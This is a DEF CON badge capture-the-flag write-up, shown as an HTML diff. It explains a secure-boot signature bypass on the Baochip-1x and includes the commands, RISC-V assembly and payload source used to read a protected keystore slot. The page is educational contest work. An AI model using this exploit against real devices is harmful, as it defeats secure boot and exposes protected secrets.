@@ -1,0 +1,1019 @@
+<title>THE_FLAG_1: How We Got It, Explained From Scratch</title>
+<style>
+:root {
+  --ground:#F1F3F2; --surface:#FFFFFF; --sunk:#E7EBE9;
+  --ink:#14181A; --muted:#5A6468; --hair:#D3DAD7;
+  --accent:#0C7A63; --accent-q:#E4F1ED;
+  --warn:#9A5510; --warn-q:#F8EEE2; --bad:#A32B2B; --lit:#14181A;
+  --mono: ui-monospace,"SF Mono",SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace;
+  --sans: ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  --step: clamp(1rem,0.6rem + 1.1vw,1.0625rem);
+}
+@media (prefers-color-scheme: dark){:root{
+  --ground:#0D1011; --surface:#15191B; --sunk:#1B2022;
+  --ink:#E4E9E7; --muted:#939E9F; --hair:#2A3134;
+  --accent:#34C6A3; --accent-q:#122924;
+  --warn:#D79A55; --warn-q:#2A2015; --bad:#E38080; --lit:#34C6A3;}}
+:root[data-theme="dark"]{
+  --ground:#0D1011; --surface:#15191B; --sunk:#1B2022;
+  --ink:#E4E9E7; --muted:#939E9F; --hair:#2A3134;
+  --accent:#34C6A3; --accent-q:#122924;
+  --warn:#D79A55; --warn-q:#2A2015; --bad:#E38080; --lit:#34C6A3;}
+:root[data-theme="light"]{
+  --ground:#F1F3F2; --surface:#FFFFFF; --sunk:#E7EBE9;
+  --ink:#14181A; --muted:#5A6468; --hair:#D3DAD7;
+  --accent:#0C7A63; --accent-q:#E4F1ED;
+  --warn:#9A5510; --warn-q:#F8EEE2; --bad:#A32B2B; --lit:#14181A;}
+
+body{background:var(--ground);color:var(--ink);font-family:var(--sans);
+     font-size:var(--step);line-height:1.65;-webkit-font-smoothing:antialiased;}
+.wrap{max-width:60rem;margin:0 auto;padding:3.5rem 1.5rem 6rem;}
+
+header.mast{display:flex;flex-direction:column;gap:1.5rem;margin-bottom:3rem;}
+.glyph{display:grid;grid-template-columns:repeat(8,9px);gap:3px;width:max-content;}
+.glyph i{width:9px;height:9px;background:var(--hair);border-radius:1px;}
+.glyph i.on{background:var(--lit);}
+.eyebrow{font-family:var(--mono);font-size:0.7rem;letter-spacing:0.16em;
+         text-transform:uppercase;color:var(--accent);margin:0;}
+h1{font-family:var(--mono);font-size:clamp(1.7rem,1.05rem + 2.3vw,2.5rem);
+   font-weight:600;letter-spacing:-0.015em;line-height:1.14;margin:0.35rem 0 0;text-wrap:balance;}
+.standfirst{color:var(--muted);max-width:42rem;margin:0.85rem 0 0;}
+
+h2{font-family:var(--mono);font-size:1.02rem;font-weight:650;letter-spacing:0.05em;
+   text-transform:uppercase;margin:3.25rem 0 1.1rem;padding-bottom:0.5rem;
+   border-bottom:1px solid var(--hair);text-wrap:balance;}
+h3{font-size:1.05rem;font-weight:650;margin:2rem 0 0.6rem;text-wrap:balance;}
+p{margin:0 0 1rem;max-width:42rem;}
+ul,ol{margin:0 0 1rem;padding-left:1.3rem;max-width:42rem;}
+li{margin-bottom:0.45rem;}
+a{color:var(--accent);}
+strong{font-weight:650;}
+em.term{font-style:normal;font-weight:650;color:var(--accent);}
+
+code{font-family:var(--mono);font-size:0.855em;background:var(--sunk);
+     padding:0.12em 0.34em;border-radius:3px;overflow-wrap:anywhere;}
+pre{font-family:var(--mono);font-size:0.8rem;line-height:1.6;background:var(--surface);
+    border:1px solid var(--hair);border-left:3px solid var(--accent);border-radius:4px;
+    padding:0.95rem 1.1rem;margin:0 0 1.15rem;overflow-x:auto;}
+pre code{background:none;padding:0;font-size:inherit;}
+.cmt{color:var(--muted);}
+
+ol.steps{list-style:none;padding:0;margin:0;max-width:none;display:flex;
+         flex-direction:column;gap:2rem;counter-reset:s;}
+ol.steps > li{counter-increment:s;display:grid;grid-template-columns:2.4rem 1fr;gap:1.1rem;margin:0;}
+ol.steps > li::before{content:counter(s,decimal-leading-zero);font-family:var(--mono);
+  font-size:0.8rem;font-weight:650;color:var(--accent);background:var(--accent-q);
+  border-radius:4px;height:2rem;display:grid;place-items:center;}
+ol.steps h3{margin-top:0.2rem;}
+ol.steps > li > div > :last-child{margin-bottom:0;}
+
+table{border-collapse:collapse;width:100%;font-size:0.9rem;}
+.scroll{overflow-x:auto;margin:0 0 1.15rem;border:1px solid var(--hair);border-radius:4px;}
+th,td{text-align:left;padding:0.55rem 0.8rem;border-bottom:1px solid var(--hair);vertical-align:top;}
+th{font-family:var(--mono);font-size:0.72rem;letter-spacing:0.07em;text-transform:uppercase;
+   color:var(--muted);background:var(--surface);white-space:nowrap;}
+tbody tr:last-child td{border-bottom:none;}
+td.n{font-family:var(--mono);font-variant-numeric:tabular-nums;white-space:nowrap;}
+
+.note{border-radius:4px;padding:0.9rem 1.1rem;margin:0 0 1.15rem;font-size:0.94rem;}
+.note > :last-child{margin-bottom:0;}
+.note.warn{background:var(--warn-q);border-left:3px solid var(--warn);}
+.note.warn .lab{color:var(--warn);}
+.note.key{background:var(--accent-q);border-left:3px solid var(--accent);}
+.note.key .lab{color:var(--accent);}
+.note.plain{background:var(--surface);border:1px solid var(--hair);}
+.note.plain .lab{color:var(--muted);}
+.lab{font-family:var(--mono);font-size:0.7rem;letter-spacing:0.13em;text-transform:uppercase;
+     font-weight:650;display:block;margin-bottom:0.35rem;}
+
+.flagbox{background:var(--surface);border:1px solid var(--hair);border-radius:4px;
+         padding:1.1rem 1.2rem;margin:0 0 1.15rem;}
+.flagbox .v{font-family:var(--mono);font-size:0.9rem;font-weight:600;
+            overflow-wrap:anywhere;line-height:1.5;margin:0.3rem 0 0;}
+
+dl.gloss{margin:0 0 1.15rem;max-width:42rem;}
+dl.gloss dt{font-weight:650;margin-top:0.9rem;}
+dl.gloss dt:first-child{margin-top:0;}
+dl.gloss dd{margin:0.15rem 0 0;color:var(--muted);}
+
+details.src{background:var(--surface);border:1px solid var(--hair);border-radius:4px;
+            margin:0 0 1rem;overflow:hidden;}
+details.src > summary{cursor:pointer;padding:0.7rem 1rem;font-family:var(--mono);
+  font-size:0.82rem;font-weight:650;letter-spacing:0.02em;list-style:none;
+  display:flex;align-items:center;gap:0.6rem;}
+details.src > summary::-webkit-details-marker{display:none;}
+details.src > summary::before{content:"+";color:var(--accent);font-weight:700;width:0.8em;}
+details.src[open] > summary::before{content:"\2212";}
+details.src > summary:hover{background:var(--sunk);}
+details.src > summary:focus-visible{outline:2px solid var(--accent);outline-offset:-2px;}
+details.src > summary .fnote{font-family:var(--sans);font-weight:400;color:var(--muted);
+  font-size:0.8rem;margin-left:auto;text-align:right;}
+details.src pre{margin:0;border:none;border-top:1px solid var(--hair);border-left:none;
+  border-radius:0;background:var(--surface);}
+
+footer{margin-top:4rem;padding-top:1.25rem;border-top:1px solid var(--hair);
+       color:var(--muted);font-size:0.85rem;}
+@media (max-width:34rem){
+  ol.steps > li{grid-template-columns:1fr;gap:0.5rem;}
+  ol.steps > li::before{width:2rem;}
+  details.src > summary{flex-wrap:wrap;}
+  details.src > summary .fnote{margin-left:0;width:100%;text-align:left;}
+}
+</style>
+
+<div class="wrap">
+<header class="mast">
+  <div class="glyph" id="g" aria-hidden="true"></div>
+  <div>
+    <p class="eyebrow">DEF CON 34 &middot; Baosec-lite badge &middot; Document 1 of 2</p>
+    <h1>THE_FLAG_1: how we got it, explained from scratch</h1>
+    <p class="standfirst">
+      No prior chip-hacking knowledge assumed. This walks through what the badge is, why it
+      refuses to hand over its secrets, the exact flaw that makes it hand them over anyway,
+      and how to repeat it yourself without damaging your badge. Every file you need is
+      included at the bottom.
+    </p>
+  </div>
+</header>
+
+<div class="flagbox">
+  <span class="lab" style="color:var(--accent)">What we pulled out &middot; keystore slot 260 &middot; address <code>0x603E_2080</code></span>
+  <p class="v"><your flag, 32 bytes></p>
+  <p style="margin:0.55rem 0 0;color:var(--muted);font-size:0.88rem">
+    32 bytes. Checksum <code><crc from page 1></code>, calculated by the badge itself and matched
+    against what we decoded from the photos, so we know we read it correctly.
+    Blank this box out before sharing the page around.
+  </p>
+</div>
+
+<h2>Part 1 &middot; What you are dealing with</h2>
+
+<p>The DEF CON 34 badge is a small computer. At its heart is a chip called
+<strong>Baochip-1x</strong>, running a processor design called <em class="term">RISC-V</em>.
+It has a little screen, a couple of buttons, and, importantly, a built-in safe.</p>
+
+<p>The safe is a region of memory called the <em class="term">keystore</em>: 2048 numbered
+slots, 32 bytes each. Some hold the badge's serial number, some hold cryptographic keys, and
+one, slot 260, named <code>THE_FLAG_1</code> in the source code, holds the flag. The chip has
+hardware that physically refuses to let the wrong code read the protected slots. Not "returns
+an error". The read just silently comes back as zeros.</p>
+
+<h3>Four terms you will need</h3>
+
+<dl class="gloss">
+  <dt>Boot chain</dt>
+  <dd>When you power the badge on, four programs run one after another: <strong>boot0</strong>
+      hands off to <strong>boot1</strong>, which hands off to the <strong>loader</strong>, which
+      starts the operating system (<strong>Xous</strong>). Each one checks the next before
+      running it.</dd>
+
+  <dt>Signature check</dt>
+  <dd>That check is a digital signature, the same idea as a wax seal. The manufacturer computes
+      a fingerprint of the program and signs it with a private key. Before running that program,
+      the badge recomputes the fingerprint and verifies the signature. Change one byte of a
+      signed program and the check fails.</dd>
+
+  <dt>Privilege modes</dt>
+  <dd>RISC-V processors run code at one of three trust levels: <strong>M-mode</strong> (machine,
+      total control, no restrictions), <strong>S-mode</strong> (supervisor, for an operating
+      system kernel), and <strong>U-mode</strong> (user, for ordinary apps). This distinction
+      turns out to be the whole trick.</dd>
+
+  <dt>RRAM</dt>
+  <dd>The chip's built-in permanent storage, 4 megabytes of it, holding all four boot programs.
+      Unlike normal RAM it survives power-off. Its addresses start at <code>0x6000_0000</code>.</dd>
+</dl>
+
+<h2>Part 2 &middot; The flaw</h2>
+
+<p>Here is the situation. The loader is a program sitting in RRAM. Before running it, boot1
+verifies its signature. But the signature does <strong>not</strong> cover the whole program.
+It covers everything from byte 132 onward. The first 132 bytes are deliberately left out,
+because that space holds the signature itself and some bookkeeping.</p>
+
+<p>The problem is what sits at byte 0 of those unsigned bytes: a jump instruction. And that jump
+instruction is <strong>the very first thing the processor executes</strong> once the signature
+check passes.</p>
+
+<div class="note key">
+  <span class="lab">The flaw in one sentence</span>
+  <p>The badge carefully verifies the book, then follows the table of contents, which is not part
+  of the book it verified. Rewrite the table of contents and it will happily jump to a chapter
+  you wrote.</p>
+</div>
+
+<p>Two more facts turn that from a curiosity into a working exploit:</p>
+
+<ol>
+  <li><strong>You can write those bytes.</strong> Boot1 has a maintenance command called
+      <code>uf2</code> that writes data to RRAM. It performs no signature check <em>at the time
+      of writing</em>. The check happens later, at boot, and only covers bytes 132 onward. So
+      writing over the jump instruction is completely permitted.</li>
+  <li><strong>You only need to write 4 bytes.</strong> RRAM writes go through a
+      read-modify-write cycle on a 32-byte block, so poking 4 bytes leaves the signature bytes
+      next door untouched. The signature still validates.</li>
+</ol>
+
+<div class="scroll">
+<table>
+  <thead><tr><th>Where to look in the source</th><th>What it shows</th></tr></thead>
+  <tbody>
+    <tr><td class="n">bao1x-hal/src/sigcheck.rs:186-192</td><td>Hashing starts at <code>img_offset + UNSIGNED_LEN</code>, and <code>UNSIGNED_LEN</code> is 132</td></tr>
+    <tr><td class="n">bao1x-hal/src/sigcheck.rs:309</td><td>On success it returns <code>jump_target = img_offset ^ tag</code></td></tr>
+    <tr><td class="n">bao1x-hal/src/sigcheck.rs:563-564</td><td><code>jump_to</code> does <code>xor t0,t1,t0; jr t0</code>, undoing the XOR and jumping to the unhashed byte 0</td></tr>
+    <tr><td class="n">boot1/src/repl.rs:137-172</td><td>The <code>uf2</code> command, with no signature check on write</td></tr>
+    <tr><td class="n">bao1x-hal/src/rram.rs:343-345</td><td>Read-modify-write on the 32-byte block</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>Run that jump into your own code and you are executing in <strong>M-mode</strong>, full
+control of the chip, on a badge that never left its locked "Sealed" state.</p>
+
+<h2>Part 3 &middot; The part that stumped us for a day</h2>
+
+<p>M-mode is total control, so you would expect to just read slot 260 and be done. You cannot.
+The keystore's hardware guard does not care how privileged you are. It cares <em>which
+identity</em> is asking, and it works that identity out from the memory-management settings.</p>
+
+<p>The source explains it, in a comment at <code>boot1/src/secboot.rs:17</code> describing what
+the lockdown function does:</p>
+
+<div class="note plain">
+  <span class="lab">The comment</span>
+  <p>"...locks out future modifications to the Coreuser setting. Also inverts mm sense, which
+  means you must enter a virtual memory <strong>user</strong> state to access sealed keys."</p>
+</div>
+
+<p>We read "user state" as "not machine mode" and tested <strong>S-mode</strong> exhaustively.
+It returned zeros every time. We concluded the protection had held, and were wrong for most of
+a day. In RISC-V, S-mode is <em>supervisor</em>. "User" means <strong>U-mode</strong>
+specifically, the lowest and least privileged level.</p>
+
+<p>And it has to be U-mode with the address-space identifier (<em class="term">ASID</em>) set to
+<strong>3</strong>, because that is the identity the badge's own legitimate keystore program runs
+under. You are not breaking the guard. You are using M-mode to construct exactly the user-mode
+context the guard is built to trust, then walking through the front door.</p>
+
+<div class="note warn">
+  <span class="lab">Why this was so easy to get wrong</span>
+  <p>A denied read returns <strong>zeros and does not fault</strong>. That looks identical to a
+  bug in your own code. You cannot tell "the chip refused me" from "my toolchain is broken"
+  unless you read something you already know the answer to, in the same breath. Build that
+  control into every single run.</p>
+</div>
+
+<h2>Part 4 &middot; Before you touch the badge</h2>
+
+<div class="note warn">
+  <span class="lab">Read this twice. It is the one unrecoverable mistake.</span>
+  <p><strong>Never enter developer mode.</strong> It is a one-way door. It erases the badge's
+  secrets, including <code>THE_FLAG_1</code> and the shared light-exchange key, and there is no
+  way back. Holding a face button at cold boot reaches <strong>boot1 update mode</strong>, a
+  completely different and perfectly safe state, but verify which one you are in before typing
+  anything (step 03).</p>
+</div>
+
+<p>What you need:</p>
+
+<ul>
+  <li>A Baosec-lite badge with removable AA cells, and a USB-C cable.</li>
+  <li>Rust, with the <code>riscv32imac-unknown-none-elf</code> target installed.</li>
+  <li>Python, with <code>pyserial</code> (to talk to the badge) and <code>pillow</code> (to
+      decode photos).</li>
+  <li>A phone camera. This is not a joke. The screen is the only way data gets out: the serial
+      port is not wired to the outside on this carrier board, the programmable-I/O buffers are
+      cleared at boot, and USB is shut down before the loader runs
+      (<code>boot1/src/main.rs:390-392</code>). So the payload draws bytes on the OLED as a grid
+      of black and white squares, and you photograph them.</li>
+</ul>
+
+<h2>Part 5 &middot; Procedure</h2>
+
+<ol class="steps">
+
+<li><div>
+<h3>Get the source that matches your badge</h3>
+<p>This matters more than it sounds. The flaw has since been fixed upstream, so if you read the
+current code you will be looking at a badge that does not exist. Check your badge's own version
+banner, then create a <em class="term">worktree</em>, a second checkout of the repository parked
+at that older commit, so you can read exactly what is running.</p>
+<pre><code>git -C repos/xous-core worktree add ./../xous-BADGE 8964027ff   <span class="cmt"># Xous v0.10.1-43</span>
+git -C repos/xous-core worktree add ./../xous-BOOT1 bcfdca404   <span class="cmt"># boot1 v0.10.1-0</span></code></pre>
+</div></li>
+
+<li><div>
+<h3>Build your payload, and check where it lands</h3>
+<p>Your program goes at address <code>0x6009_0000</code>, a gap of free space between the end of
+the loader and the start of the operating system image.</p>
+<p>The operating system begins at <code>0x6009_9000</code> (<code>offsets/common.rs:13</code>).
+<strong>If your program is big enough to reach that address, you overwrite the OS and brick the
+badge.</strong> Do not eyeball this. Make the build fail instead. That is what the two asserts in
+<code>elf2bin.py</code> below are for.</p>
+<pre><code>cargo build --release
+python elf2bin.py target/riscv32imac-unknown-none-elf/release/dc34-payload payload.bin</code></pre>
+</div></li>
+
+<li><div>
+<h3>Get into boot1 update mode</h3>
+<p>Take <strong>both AA cells out</strong>, unplug USB, wait about 30 seconds, then hold any face
+button while you plug USB back in.</p>
+<p>The cells genuinely have to come out. There is a flag called <code>warm_boot</code>
+(<code>bao1x-api/src/lib.rs:71-77</code>) that gets set every time the OS starts, and it clears
+only when the chip fully loses power. While it is set, <code>boot1/src/main.rs:180</code> boots
+straight through and ignores your button.</p>
+<p><strong>Now check you are in the right place.</strong> The badge should appear on USB as
+<code>Baochip_1x</code>. If it says <code>Baosec_lite</code>, it booted normally, so start over.
+Type <code>echo hello</code> at the prompt and you should get <code>hello</code> back.</p>
+</div></li>
+
+<li><div>
+<h3>Upload your program</h3>
+<p><code>uf2</code> takes base64-encoded chunks over the USB serial port and writes them into
+RRAM. Nothing checks a signature here.</p>
+<pre><code>python uf2send.py file 0x60090000 payload.bin</code></pre>
+</div></li>
+
+<li><div>
+<h3>Redirect the jump</h3>
+<p>This is the exploit itself: one 4-byte write. <code>0x0003006F</code> is the RISC-V encoding
+of "jump forward <code>0x30000</code> bytes", which is exactly the distance from the loader's
+start to your program.</p>
+<pre><code>python uf2send.py word 0x60060000 0003006F</code></pre>
+<div class="note plain">
+  <span class="lab">Optional, but worth doing once</span>
+  <p>Before running a real payload, write <code>j .</code> (jump to yourself, an infinite loop)
+  instead. The badge goes totally dark, no USB. That single observation <em>proves</em> your code
+  ran: if the signature check had failed, boot1 would have printed "Image did not validate" and
+  dropped you back to the update prompt (<code>boot1/src/main.rs:182</code>). Silence means the
+  check passed <strong>and</strong> your instruction executed.</p>
+</div>
+</div></li>
+
+<li><div>
+<h3>Power cycle, no button this time</h3>
+<p>boot0, then boot1, then signature verified, then <code>jr t0</code> into your code, in machine
+mode, on a sealed badge.</p>
+</div></li>
+
+<li><div>
+<h3>Drop to U-mode at ASID 3 and read the slot</h3>
+<p>Three things happen here. You build a page table that maps memory one-to-one with the
+<em class="term">user-accessible</em> bit set. You point <code>satp</code>, the register that
+controls address translation, at that table with ASID 3. Then you use <code>mret</code> to
+"return" into user mode, which is how a RISC-V machine deliberately hands control to less
+privileged code.</p>
+<pre><code>for i in 0..1024 { pt[i] = (i &lt;&lt; 20) | 0xDF; }   <span class="cmt">// 0xDF sets D|A|U|X|W|R|V; U = user-accessible</span>
+
+csrw mtvec, {trap}          <span class="cmt">// where to land when we come back</span>
+csrw medeleg, zero          <span class="cmt">// see the pitfalls table. not optional.</span>
+csrw mideleg, zero
+csrw stvec, {trap}
+sfence.vma
+csrw satp, {satp}           <span class="cmt">// 0x80C61000 = Sv32 paging | ASID 3 | table address</span>
+sfence.vma
+li   t0, 0x1800
+csrc mstatus, t0            <span class="cmt">// clear MPP to 00 = return to U-mode. NOT 01, which is S-mode.</span>
+csrw mepc, {u_phase}
+mret</code></pre>
+<p>Now, in user mode, read 32 bytes from <code>0x603E_2080</code>, which is
+<code>DATA_SLOT_START + 260 &times; 32</code>. Also read the serial-number slot as your control.
+Checksum both on-chip. Then <code>ecall</code> to bounce back to machine mode, which is where you
+are allowed to drive the display hardware.</p>
+</div></li>
+
+<li><div>
+<h3>Photograph the screen and decode</h3>
+<p>The payload draws eight bytes per screen as an 8 by 8 grid of squares, each 12 pixels with a
+14-pixel spacing, inset 8 pixels from the edge. It also draws a 2-pixel lit border around the
+whole panel so the decoder can find the corners in a hand-held photo, plus small blobs along the
+top edge counting off which page you are looking at.</p>
+<p>Hold each page about 3 seconds. Our first attempt cycled at roughly 6 Hz and was completely
+unphotographable.</p>
+<p><strong>Page 2 is the control.</strong> On this unit it must decode to exactly
+<code><your UUID control></code>. Pages 3 to 6 are the flag. If the control is wrong, throw the whole
+photo set away. Do not try to salvage the flag pages from it.</p>
+<pre><code>python decode.py page*.jpg
+python assemble.py &lt;p3&gt; &lt;p4&gt; &lt;p5&gt; &lt;p6&gt; <crc from page 1></code></pre>
+</div></li>
+
+<li><div>
+<h3>Put the badge back</h3>
+<p>Cold boot into update mode again and restore the original jump instruction.
+<code>0x3000006F</code> is what the build system originally generated there.</p>
+<pre><code>python uf2send.py word 0x60060000 3000006F</code></pre>
+<p>Next power cycle, the badge boots normally. Nothing in the badge's file storage was ever
+touched, so your saved data and any custom splash image are exactly where you left them.</p>
+</div></li>
+
+</ol>
+
+<h2>Part 6 &middot; Things that will waste a boot cycle</h2>
+
+<p>Every one of these cost us at least one attempt. A boot cycle is roughly five minutes of
+pulling batteries and waiting, so they add up fast.</p>
+
+<div class="scroll">
+<table>
+  <thead><tr><th>What you will see</th><th>What is actually wrong</th><th>Fix</th></tr></thead>
+  <tbody>
+    <tr>
+      <td>Screen stays blank, badge seems dead</td>
+      <td>Boot1 leaves the trap-delegation registers set to all ones
+          (<code>boot1/src/platform/bao1x/irq.rs:50-51</code>) and never restores them. Your own
+          <code>ecall</code> gets routed to an address that was never initialised.</td>
+      <td>Clear <code>medeleg</code> and <code>mideleg</code> before <code>mret</code></td>
+    </tr>
+    <tr>
+      <td>Variables contain nonsense</td>
+      <td>There is no C runtime on this path, so the zero-initialised data section
+          (<code>.bss</code>) is never actually zeroed. Your "empty" variables hold whatever was
+          in RAM.</td>
+      <td>Zero <code>__sbss</code> to <code>__ebss</code> yourself in <code>_start</code></td>
+    </tr>
+    <tr>
+      <td>Screen looks like a photo negative</td>
+      <td><code>clear()</code> fills the buffer with all ones, so on this panel a
+          <strong>0 bit is lit</strong></td>
+      <td>Invert your rendering</td>
+    </tr>
+    <tr>
+      <td>Everything reads as zeros, no error</td>
+      <td>The keystore denied you. It does this silently.</td>
+      <td>Always read a known value alongside</td>
+    </tr>
+    <tr>
+      <td>Control page decodes fine, flag is still zeros</td>
+      <td>You are in S-mode, not U-mode</td>
+      <td><code>MPP = 00</code>, not <code>01</code></td>
+    </tr>
+    <tr>
+      <td>Pages flicker too fast to photograph</td>
+      <td><code>spin(30_000_000)</code> is about 0.09 seconds</td>
+      <td>Use <code>spin(400_000_000)</code>, roughly 3 seconds</td>
+    </tr>
+    <tr>
+      <td>Decode looks plausible but is subtly wrong</td>
+      <td>Your sampling grid is off by one whole cell, which silently inserts a byte</td>
+      <td>Measure your offset search in cells, not pixels, and trust only a CRC match</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="note warn">
+  <span class="lab">The trap that got us twice. Please do not repeat it.</span>
+  <p>The serial-number slot is marked <code>PartitionAccess::Open</code>, which means
+  <em>everyone</em> can read it. Reading it successfully proves your user-mode context is alive.
+  It does <strong>not</strong> prove you can read protected slots. We validated the technique
+  against the open slot, generalised the result to the protected slot, and wrote a wrong
+  conclusion into two documents before catching it.</p>
+  <p>The rule that came out of it: your control has to be in the <em>same permission class</em>
+  as the thing you are claiming to read. Otherwise it is not a control, it is a comfort blanket.</p>
+</div>
+
+<h2>Part 7 &middot; Every file, complete</h2>
+
+<p>Drop these into a <code>payload/</code> directory sitting next to your
+<code>repos/xous-BADGE</code> worktree and it builds. The Rust file is the entire payload, not an
+excerpt.</p>
+
+<details class="src"><summary>Cargo.toml<span class="fnote">build config</span></summary><pre><code>[package]
+name    = &quot;dc34-payload&quot;
+version = &quot;0.1.0&quot;
+edition = &quot;2021&quot;
+
+[[bin]]
+name = &quot;dc34-payload&quot;
+path = &quot;src/main.rs&quot;
+
+# All four of these are path deps on the WORKTREE pinned to your badge&#x27;s commit,
+# not on upstream. That is the whole reason for the worktree in step 01.
+[dependencies]
+utralib   = { path = &quot;../repos/xous-BADGE/utralib&quot;,         default-features = false, features = [&quot;bao1x&quot;] }
+bao1x-hal = { path = &quot;../repos/xous-BADGE/libs/bao1x-hal&quot;,  default-features = false, features = [&quot;loader-baosec&quot;, &quot;security&quot;] }
+bao1x-api = { path = &quot;../repos/xous-BADGE/libs/bao1x-api&quot;,  default-features = false }
+ux-api    = { path = &quot;../repos/xous-BADGE/libs/ux-api&quot;,     default-features = false, features = [&quot;loader-baosec&quot;] }
+
+[profile.release]
+opt-level     = &quot;z&quot;     # keep the image small: the window to KERNEL_START is only 36 KiB
+lto           = true
+panic         = &quot;abort&quot;
+codegen-units = 1
+debug         = false
+</code></pre></details>
+
+<details class="src"><summary>.cargo/config.toml<span class="fnote">target + linker script</span></summary><pre><code># .cargo/config.toml
+[build]
+target = &quot;riscv32imac-unknown-none-elf&quot;
+
+[target.riscv32imac-unknown-none-elf]
+rustflags = [&quot;-C&quot;, &quot;link-arg=-Tpayload.x&quot;]
+</code></pre></details>
+
+<details class="src"><summary>payload.x<span class="fnote">linker script</span></summary><pre><code>/* payload.x -- free RRAM above the loader image, below KERNEL_START.
+   Verified free empirically: writing at 0x60090000 and restoring the header
+   left the loader signature valid across a dozen cycles. */
+MEMORY
+{
+  PAYLOAD : ORIGIN = 0x60090000, LENGTH = 0xFC00   /* hard ceiling: KERNEL_START 0x60099000 */
+  RAM     : ORIGIN = 0x61100000, LENGTH = 512K
+}
+ENTRY(_start)
+SECTIONS
+{
+  .text : {
+    KEEP(*(.text.entry))          /* _start MUST be the first byte at ORIGIN: */
+                                  /* the retargeted jump lands exactly here   */
+    *(.text .text.*)
+    *(.rodata .rodata.*)
+    . = ALIGN(4);
+  } &gt; PAYLOAD
+
+  .data : { *(.data .data.*) . = ALIGN(4); } &gt; PAYLOAD
+
+  .bss (NOLOAD) : {
+    . = ALIGN(4); __sbss = .;
+    *(.bss .bss.*) *(COMMON)
+    . = ALIGN(4); __ebss = .;
+  } &gt; RAM
+
+  _stack_top = ORIGIN(RAM) + LENGTH(RAM);
+  /DISCARD/ : { *(.eh_frame) *(.eh_frame_hdr) }
+}
+</code></pre></details>
+
+<details class="src"><summary>src/main.rs<span class="fnote">the flag 1 payload, complete</span></summary><pre><code>// src/main.rs -- stage-2 payload: read THE_FLAG_1 from U-mode at ASID 3.
+#![no_std]
+#![no_main]
+use core::panic::PanicInfo;
+#[panic_handler]
+fn panic(_i: &amp;PanicInfo) -&gt; ! { loop { core::hint::spin_loop() } }
+
+const CLKTOP_HZ:  u32   = 700_000_000;
+const SLOT_BASE:  usize = 0x603E_0000;                // DATA_SLOT_START
+const fn slot(n: usize) -&gt; usize { SLOT_BASE + n * 32 }
+const FLAG_ADDR:  usize = slot(260);                  // THE_FLAG_1, PartitionAccess::Fw0
+const UUID_ADDR:  usize = slot(1);                    // Open. LIVENESS control only.
+const PT_ADDR:    usize = 0x6100_0000;                // page table, 4 KiB aligned
+const SATP:       u32   = (1 &lt;&lt; 31)                   // MODE = Sv32
+                        | (3 &lt;&lt; 22)                   // ASID = 3  (the keystore service)
+                        | ((PT_ADDR as u32) &gt;&gt; 12);   // PPN
+
+static mut RES_F:   [u8; 32] = [0; 32];
+static mut RES_U:   [u8; 32] = [0; 32];
+static mut FAULTED: u32      = 0;
+
+// Nothing else zeroes .bss on this link path: there is no C runtime here.
+core::arch::global_asm!(
+    &quot;.section .text.entry, \&quot;ax\&quot;&quot;,
+    &quot;.global _start&quot;,
+    &quot;_start:&quot;,
+    &quot;  la   sp, _stack_top&quot;,
+    &quot;  la   t0, __sbss&quot;,
+    &quot;  la   t1, __ebss&quot;,
+    &quot;1:  bgeu t0, t1, 2f&quot;,
+    &quot;  sw   zero, 0(t0)&quot;,
+    &quot;  addi t0, t0, 4&quot;,
+    &quot;  j    1b&quot;,
+    &quot;2:  j payload_main&quot;,
+);
+
+// mcause 8 = ecall from U-mode (our clean finish). Anything else is a real fault,
+// so latch a flag and still get to the screen: a silent hang tells you nothing.
+core::arch::global_asm!(
+    &quot;.section .text, \&quot;ax\&quot;&quot;,
+    &quot;.align 4&quot;,
+    &quot;.global trap_entry&quot;,
+    &quot;trap_entry:&quot;,
+    &quot;  csrr t2, mcause&quot;,
+    &quot;  li   t3, 8&quot;,
+    &quot;  beq  t2, t3, 1f&quot;,
+    &quot;  li   t3, 9&quot;,
+    &quot;  beq  t2, t3, 1f&quot;,
+    &quot;  la   t0, {faulted}&quot;,
+    &quot;  li   t1, 1&quot;,
+    &quot;  sw   t1, 0(t0)&quot;,
+    &quot;1:&quot;,
+    &quot;  li   t0, 0x1800&quot;,
+    &quot;  csrs mstatus, t0&quot;,          // MPP = 11, back to machine mode
+    &quot;  la   sp, _stack_top&quot;,
+    &quot;  la   t0, render&quot;,
+    &quot;  csrw mepc, t0&quot;,
+    &quot;  mret&quot;,
+    faulted = sym FAULTED,
+);
+unsafe extern &quot;C&quot; { fn trap_entry(); }
+
+/// Runs in U-mode with satp.ASID = 3. This is the whole trick.
+#[unsafe(no_mangle)]
+pub unsafe extern &quot;C&quot; fn u_phase() -&gt; ! {
+    unsafe {
+        let f = core::ptr::addr_of_mut!(RES_F) as *mut u8;
+        let u = core::ptr::addr_of_mut!(RES_U) as *mut u8;
+        for i in 0..32 {
+            core::ptr::write_volatile(f.add(i),
+                core::ptr::read_volatile((FLAG_ADDR + i) as *const u8));
+            core::ptr::write_volatile(u.add(i),
+                core::ptr::read_volatile((UUID_ADDR + i) as *const u8));
+        }
+        core::arch::asm!(&quot;ecall&quot;, options(noreturn));
+    }
+}
+
+#[unsafe(no_mangle)]
+pub extern &quot;C&quot; fn payload_main() -&gt; ! {
+    unsafe {
+        // Sv32 identity map, 4 MiB megapages. 0xDF = D|A|U|X|W|R|V.
+        // The U bit is what lets user mode touch these pages at all.
+        let pt = PT_ADDR as *mut u32;
+        for i in 0..1024usize {
+            core::ptr::write_volatile(pt.add(i), ((i as u32) &lt;&lt; 20) | 0xDF);
+        }
+        core::arch::asm!(
+            &quot;csrw mtvec, {tv}&quot;,
+            // boot1 leaves medeleg/mideleg at 0xFFFFFFFF (irq.rs:50-51) and never
+            // restores them. Without this, our own ecall is delivered to an
+            // uninitialised stvec and the badge hangs with a blank screen.
+            &quot;csrw medeleg, zero&quot;,
+            &quot;csrw mideleg, zero&quot;,
+            &quot;csrw stvec, {tv}&quot;,
+            &quot;sfence.vma&quot;,
+            &quot;csrw satp, {satp}&quot;,
+            &quot;sfence.vma&quot;,
+            &quot;li   t0, 0x1800&quot;,
+            &quot;csrc mstatus, t0&quot;,        // MPP = 00 -&gt; U-mode.  01 would be S-mode: reads zeros.
+            &quot;csrw mepc, {e}&quot;,
+            &quot;mret&quot;,
+            tv   = in(reg) trap_entry as usize,
